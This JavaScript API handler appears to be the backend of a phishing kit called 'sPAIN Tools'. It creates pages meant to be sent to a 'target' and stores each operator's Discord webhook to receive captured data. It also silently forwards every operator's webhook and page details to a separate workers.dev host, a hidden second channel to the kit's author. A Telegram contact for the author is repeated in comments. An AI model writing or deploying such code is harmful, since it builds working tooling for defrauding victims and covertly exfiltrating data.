const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev';
// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  return json.result;
}
// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
async function redisSet(key, value) {
  const res = await fetch(
    `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
    { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
  );
  return res.ok;
}

// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
async function notifyWorker(endpoint, data) {
  try {
    await fetch(`${WORKER_URL}${endpoint}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  } catch (_) {}
}
// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
async function notifyCreatorWebhook(webhookUrl, url, slug, displayName, type) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'sPAIN Tools',
        embeds: [{
          title: `✅ Your ${type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page is ready!`,
          description: `Your page has been created successfully.\n\n**Share this link with your target:**\n${url}`,
          color: type === 'dualhook' ? 0x06b6d4 : 0xc026d3,
          fields: [
            { name: '📁 Slug',         value: `\`${slug}\``,  inline: true },
            { name: '🏷 Display Name', value: displayName,    inline: true },
            { name: '🔗 Your Link',    value: url,            inline: false }
          ],
          footer: { text: 'sPAIN Tools — Keep this webhook private!' },
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch (_) {}
}
// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { name, displayName, webhook, inviteUrl, charUrl, type, dualhookParent } = body || {};
// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
  if (!name)    return res.status(400).json({ error: 'name is required' });
  if (!webhook) return res.status(400).json({ error: 'webhook is required' });

  const slug = name.trim().toLowerCase().replace(/\s+/g, '-');

  if (!/^[a-z0-9_-]+$/i.test(slug)) {
    return res.status(400).json({ error: 'Name can only contain letters, numbers, hyphens, underscores' });
  }

  const RESERVED = ['api', 'index', 'favicon', 'robots', 'sitemap', '_next', 'static'];
  if (RESERVED.includes(slug)) {
    return res.status(400).json({ error: 'That name is reserved' });
  }

  try {
    const existing = await redisGet(`slot:${slug}`);
    if (existing !== null) {
      return res.status(200).json({ taken: true });
    }
// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
    const record = {
      slug,
      displayName:    displayName    || slug,
      webhook,
      inviteUrl:      inviteUrl      || '',
      charUrl:        charUrl        || '',
      type:           type === 'dualhook' ? 'dualhook' : 'slots',
      dualhookParent: dualhookParent || null,
      createdAt:      new Date().toISOString()
    };
// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
    const ok = await redisSet(`slot:${slug}`, record);
    if (!ok) return res.status(500).json({ error: 'Failed to save' });

    const url = `https://spain-tools.vercel.app/${slug}`;

    await notifyCreatorWebhook(webhook, url, slug, record.displayName, record.type);

    // IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
    await notifyWorker('/notify/create', {
      slug,
      displayName: record.displayName,
      url,
      webhook,
      inviteUrl,
      dualhookParent,
      type: record.type,
      createdAt: record.createdAt
    });

    // IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
    await notifyWorker('/notify/webhook', {
      type: record.type,
      webhook: webhook
    });
// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
    return res.status(200).json({ success: true, url, slug });

  } catch (err) {
    return res.status(500).json({ error: 'Server error', detail: err.message });
  }
}
